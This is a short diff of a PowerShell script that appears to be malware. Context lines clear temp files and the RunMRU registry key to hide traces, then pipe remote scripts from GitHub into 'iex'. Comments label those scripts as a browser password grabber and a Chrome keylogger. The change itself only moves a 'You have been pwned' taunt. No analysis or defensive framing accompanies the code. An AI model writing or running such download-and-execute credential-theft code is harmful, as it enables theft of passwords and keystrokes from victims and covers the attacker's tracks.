@@ -305,8 +305,9 @@ if ($removeTraces) {
     Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
 }
+
+Write-Output "✨ You have been pwned lmaooo :3 :3"
 # Grab pass browserpassview
 Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1 | iex
 # keylogchrome
 Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
-Write-Output "✨ You have been pwned lmaooo :3 :3"
